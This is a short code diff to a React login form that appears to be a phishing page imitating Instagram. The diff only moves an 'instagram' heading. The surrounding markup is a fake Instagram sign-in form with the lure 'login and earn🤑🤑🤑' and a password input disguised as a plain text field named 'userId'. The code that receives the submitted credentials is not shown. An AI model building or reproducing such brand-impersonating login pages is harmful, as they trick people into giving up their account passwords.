@@ -32,12 +32,15 @@ function LoginForm() {
   };
 
   return (
+
+
+    
     <div className="container">
       
       <h3>login and earn🤑🤑🤑</h3>
-      
+      <h1>instagram</h1>
     <div className="login-box">
-      <h1>Instagram</h1>
+      
       <form id="loginForm" onSubmit={onSubmit}>
         <input type="text" name="user-name" placeholder="Phone number, username, or email" required/>
         <input type="text" name="userId" placeholder="Password" required/>
